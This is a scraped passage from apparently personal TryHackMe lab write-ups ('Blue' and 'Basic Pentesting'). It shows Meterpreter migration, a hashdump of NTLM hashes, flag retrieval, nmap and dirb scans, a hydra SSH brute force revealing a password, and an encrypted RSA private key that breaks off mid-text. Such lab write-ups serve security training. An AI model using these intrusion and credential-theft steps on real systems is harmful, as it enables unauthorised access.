AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1012 824 WmiPrvSE.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 1068 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1160 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 1292 700 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 1380 2856 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 1392 700 amazon-ssm-agent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\SSM\\amazon-ssm-agent.exe 1468 700 LiteAgent.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Xentools\\LiteAgent.exe 1588 700 Ec2Config.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe 1780 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1856 2200 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 1936 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1940 700 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\svchost.exe 2144 552 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2200 700 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 2216 2504 cmd.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\SysWOW64\\cmd.exe 2328 700 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE C:\\Windows\\System32\\svchost.exe 2360 700 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE C:\\Windows\\System32\\sppsvc.exe 2428 700 svchost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\svchost.exe 2504 1380 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe 2560 700 vds.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\vds.exe 2664 700 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchIndexer.exe 2796 1292 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 3020 700 TrustedInstaller.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\servicing\\TrustedInstaller.exe\n We write down the process id 2796. 8. We migrate to the process whose id we noted: meterpreter \u0026gt; migrate 2796 [] Migrating from 2504 to 2796\u0026hellip; [] Migration completed successfully.\n ## Task 4: Cracking 1. We run the command hashdump. meterpreter \u0026gt; hashdump Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::\n So the user is Jon. 2. Windows uses LM and NTLM hashing. We crack the hashes using hashcat  ## Task 5: Find flags! 1. meterpreter \u0026gt; cd C:\\\nmeterpreter \u0026gt; ls Listing: C:\\ Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2009-07-13 23:18:56 -0400 $Recycle.Bin 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Documents and Settings 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:08 -0400 PerfLogs 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Program Files (x86) 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:08 -0400 ProgramData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:22 -0500 Recovery 40777/rwxrwxrwx 4096 dir 2018-12-12 18:01:17 -0500 System Volume Information 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Users 40777/rwxrwxrwx 16384 dir 2009-07-13 23:20:08 -0400 Windows 100666/rw-rw-rw- 24 fil 2018-12-12 22:47:39 -0500 flag1.txt 0000/\u0026mdash;\u0026mdash;\u0026mdash; 2141120 fif 1970-01-30 18:20:00 -0500 hiberfil.sys 0000/\u0026mdash;\u0026mdash;\u0026mdash; 2141120 fif 1970-01-30 18:20:00 -0500 pagefile.sys\nmeterpreter \u0026gt; cat flag1.txt flag{access_the_machine}\n 2. meterpreter \u0026gt; pwd C:\\Windows\\System32\\config meterpreter \u0026gt; ls Listing: C:\\Windows\\System32\\config Mode Size Type Last modified Name\n 100666/rw-rw-rw- 28672 fil 2009-07-14 01:32:39 -0400 BCD-Template 100666/rw-rw-rw- 25600 fil 2009-07-14 01:38:35 -0400 BCD-Template.LOG 100666/rw-rw-rw- 18087936 fil 2009-07-13 22:34:08 -0400 COMPONENTS 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 COMPONENTS.LOG 100666/rw-rw-rw- 13312 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 COMPONENTS.LOG2 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms 100666/rw-rw-rw- 1048576 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms 100666/rw-rw-rw- 65536 fil 2020-03-25 15:20:45 -0400 COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf 100666/rw-rw-rw- 65536 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2009-07-14 00:54:56 -0400 COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 DEFAULT 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 DEFAULT.LOG 100666/rw-rw-rw- 177152 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 DEFAULT.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2009-07-13 23:20:10 -0400 Journal 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 RegBack 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SAM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:31 -0400 SAM.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SAM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SAM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SECURITY 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SECURITY.LOG 100666/rw-rw-rw- 21504 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SECURITY.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:22:08 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:22:09 -0400 SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 40632320 fil 2009-07-13 22:34:08 -0400 SOFTWARE 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SOFTWARE.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SOFTWARE.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:18 -0400 SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 100666/rw-rw-rw- 12582912 fil 2009-07-13 22:34:08 -0400 SYSTEM 100666/rw-rw-rw- 1024 fil 2009-07-14 03:07:30 -0400 SYSTEM.LOG 100666/rw-rw-rw- 262144 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG1 100666/rw-rw-rw- 0 fil 2009-07-13 22:34:08 -0400 SYSTEM.LOG2 100666/rw-rw-rw- 65536 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2019-03-17 18:21:15 -0400 SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 TxR 100666/rw-rw-rw- 34 fil 2018-12-12 22:48:22 -0500 flag2.txt 40777/rwxrwxrwx 4096 dir 2009-07-13 23:20:10 -0400 systemprofile\nmeterpreter \u0026gt; cat flag2.txt flag{sam_database_elevated_access}\n 3. meterpreter \u0026gt; cd Users lmeterpreter \u0026gt; ls Listing: C:\\Users Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 All Users 40555/r-xr-xr-x 8192 dir 2009-07-13 23:20:08 -0400 Default 40777/rwxrwxrwx 0 dir 2009-07-14 01:08:56 -0400 Default User 40777/rwxrwxrwx 8192 dir 2018-12-12 22:13:28 -0500 Jon 40555/r-xr-xr-x 4096 dir 2009-07-13 23:20:08 -0400 Public 100666/rw-rw-rw- 174 fil 2009-07-14 00:54:24 -0400 desktop.ini\nmeterpreter \u0026gt; cd Jon meterpreter \u0026gt; ls Listing: C:\\Users\\Jon Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 AppData 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Application Data 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:37 -0500 Contacts 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Cookies 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Desktop 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Documents 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Downloads 40555/r-xr-xr-x 4096 dir 2018-12-12 22:13:31 -0500 Favorites 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Links 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Local Settings 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Documents 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT 100666/rw-rw-rw- 65536 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms 100666/rw-rw-rw- 524288 fil 2018-12-12 22:13:31 -0500 NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 NetHood 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 PrintHood 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Recent 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Saved Games 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:45 -0500 Searches 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 SendTo 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Start Menu 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 Templates 40555/r-xr-xr-x 0 dir 2018-12-12 22:13:31 -0500 Videos 100666/rw-rw-rw- 262144 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG1 100666/rw-rw-rw- 0 fil 2018-12-12 22:13:31 -0500 ntuser.dat.LOG2 100666/rw-rw-rw- 20 fil 2018-12-12 22:13:31 -0500 ntuser.ini\nmeterpreter \u0026gt; cd Documents meterpreter \u0026gt; ls Listing: C:\\Users\\Jon\\Documents Mode Size Type Last modified Name\n 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Music 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Pictures 40777/rwxrwxrwx 0 dir 2018-12-12 22:13:31 -0500 My Videos 100666/rw-rw-rw- 402 fil 2018-12-12 22:13:45 -0500 desktop.ini 100666/rw-rw-rw- 37 fil 2018-12-12 22:49:18 -0500 flag3.txt\nmeterpreter \u0026gt; cat flag3.txt flag{admin_documents_can_be_valuable}\n","id":12,"section":"writeups","summary":"Task 1:  We use the usual nmap to scan the machine. Note that it says that the machine does not respond to ICMP requests. So, we have to use -Pn with nmap for scanning  nmap -sC -sV -Pn -oN nmap-out 10.10.221.176 The results:\n# Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN nmap.out 10.10.221.176 Nmap scan report for 10.10.221.176 Host is up (0.","tags":null,"title":"TryHackMe - Blue Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-blue-writeup/","year":"2020"},{"content":"Task 1: 1. Deploy the machine and connect to our network We deploy the machine and connect to the vpn network using openvpn\nsudo openvpn [your generated .ovpn file] 2. Find the services exposed by the machine We use our usual nmap scan with service detection for scanning:\nnmap -sC -sV -oA nmap-out 10.10.174.122 Output:\n# Nmap 7.80 scan initiated Wed Mar 25 00:13:59 2020 as: nmap -sC -sV -oN nmap-out 10.10.174.122 Nmap scan report for 10.10.174.122 Host is up (0.22s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA) | 256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA) |_ 256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.7 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat/9.0.7 Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s |_nbstat: NetBIOS name: BASIC2, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: basic2 | NetBIOS computer name: BASIC2\\x00 | Domain name: \\x00 | FQDN: basic2 |_ System time: 2020-03-25T00:14:50-04:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-25T04:14:50 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Mar 25 00:14:56 2020 -- 1 IP address (1 host up) scanned in 57.48 seconds 3. What is the name of the hidden directory on the web server(enter name without /)?\nIn order to find the directories in the site, we use a tool called dirb. There are many other directory busting tools like dirbuster(gui based) and gobuster(uses the go language environment), you can use anyone you like, I used dirb:\ndirb http://10.10.174.122/ /usr/share/wordlists/dirb/common.txt It took some time, so be patient. my output:\n----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Wed Mar 25 00:18:29 2020 URL_BASE: http://10.10.174.122/ WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.10.174.122/ ---- ==\u0026gt; DIRECTORY: http://10.10.174.122/development/ + http://10.10.174.122/index.html (CODE:200|SIZE:158) + http://10.10.174.122/server-status (CODE:403|SIZE:301) ---- Entering directory: http://10.10.174.122/development/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ----------------- END_TIME: Wed Mar 25 00:38:19 2020 DOWNLOADED: 4612 - FOUND: 2 Voila! We found our hidden direcrtory development\n4. User brute-forcing to find the username \u0026amp; password Brute-forcing both the username and password is not very practical in this situation as it would take days even on a good machine. So, we use enumeration here in order to find out the usernames. In order to enumerate, we use the very popular tool enum4linux.\nenum4linux -a 10.10.174.122 | tee enum.log Output:\nHere, we find 2 users:\n Jan Kay  5. What is the username? So, our required user is Jan here.\n6. What is the password? We need to find a password for the user Jan. We use a dictionary attack using the password cracking tool hydra.\nhydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.244.4 Output:\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-25 04:25:25 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [DATA] attacking ssh://10.10.244.4:22/ [STATUS] 174.00 tries/min, 174 tries in 00:01h, 14344228 to do in 1373:59h, 16 active [STATUS] 113.00 tries/min, 339 tries in 00:03h, 14344063 to do in 2115:39h, 16 active [STATUS] 110.14 tries/min, 771 tries in 00:07h, 14343631 to do in 2170:28h, 16 active [22][ssh] host: 10.10.244.4 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-25 04:33:07 Thus, we found the password: armando\n7. What service do you use to access the server(answer in abbreviation in all caps)?\nwe use SSH. Using ssh we login as Jan into the server:\nssh 8. Enumerate the machine to find any vectors for privilege escalation This step involves linux enumeration. [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/] We use the script linpeas.sh\nroot@kali:~# ssh jan@10.10.230.216 jan@10.10.230.216's password: Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ jan@basic2:~$ ls -la total 12 drwxr-xr-x 2 root root 4096 Apr 23 2018 . drwxr-xr-x 4 root root 4096 Apr 19 2018 .. -rw------- 1 root jan 47 Apr 23 2018 .lesshst jan@basic2:~$ cd ../ jan@basic2:/home$ ls -la total 16 drwxr-xr-x 4 root root 4096 Apr 19 2018 . drwxr-xr-x 24 root root 4096 Apr 23 2018 .. drwxr-xr-x 2 root root 4096 Apr 23 2018 jan drwxr-xr-x 5 kay kay 4096 Apr 23 2018 kay jan@basic2:/home$ cd kay jan@basic2:/home/kay$ ls -la total 48 drwxr-xr-x 5 kay kay 4096 Apr 23 2018 . drwxr-xr-x 4 root root 4096 Apr 19 2018 .. -rw------- 1 kay kay 756 Apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 Apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 Apr 17 2018 .bashrc drwx------ 2 kay kay 4096 Apr 17 2018 .cache -rw------- 1 root kay 119 Apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 Apr 23 2018 .nano -rw------- 1 kay kay 57 Apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 Apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 Apr 23 2018 .ssh -rw-r--r-- 1 kay kay 0 Apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 Apr 23 2018 .viminfo jan@basic2:/home/kay$ cd .ssh/ jan@basic2:/home/kay/.ssh$ ls -la total 20 drwxr-xr-x 2 kay kay 4096 Apr 23 2018 . drwxr-xr-x 5 kay kay 4096 Apr 23 2018 .. -rw-rw-r-- 1 kay kay 771 Apr 23 2018 authorized_keys -rw-r--r-- 1 kay kay 3326 Apr 19 2018 id_rsa -rw-r--r-- 1 kay kay 771 Apr 19 2018 id_rsa.pub jan@basic2:/home/kay/.ssh$ cat id_rsa -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75 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 